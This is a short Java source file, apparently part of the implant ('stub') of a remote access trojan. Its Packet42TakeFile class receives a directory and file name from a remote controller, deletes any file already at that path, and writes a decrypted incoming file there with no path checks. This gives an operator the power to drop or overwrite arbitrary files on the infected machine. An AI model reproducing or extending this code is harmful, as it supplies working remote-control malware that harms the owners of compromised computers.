package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.common.io.FileIO;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;


public class Packet42TakeFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();
		
		File file = new File(destdir + File.separator + filename);
		
		if (file.exists() && file.isFile()) {
			file.delete();
		}
		
		FileIO.readFile(file, Connection.dis, null, Main.getKey());
	}

}
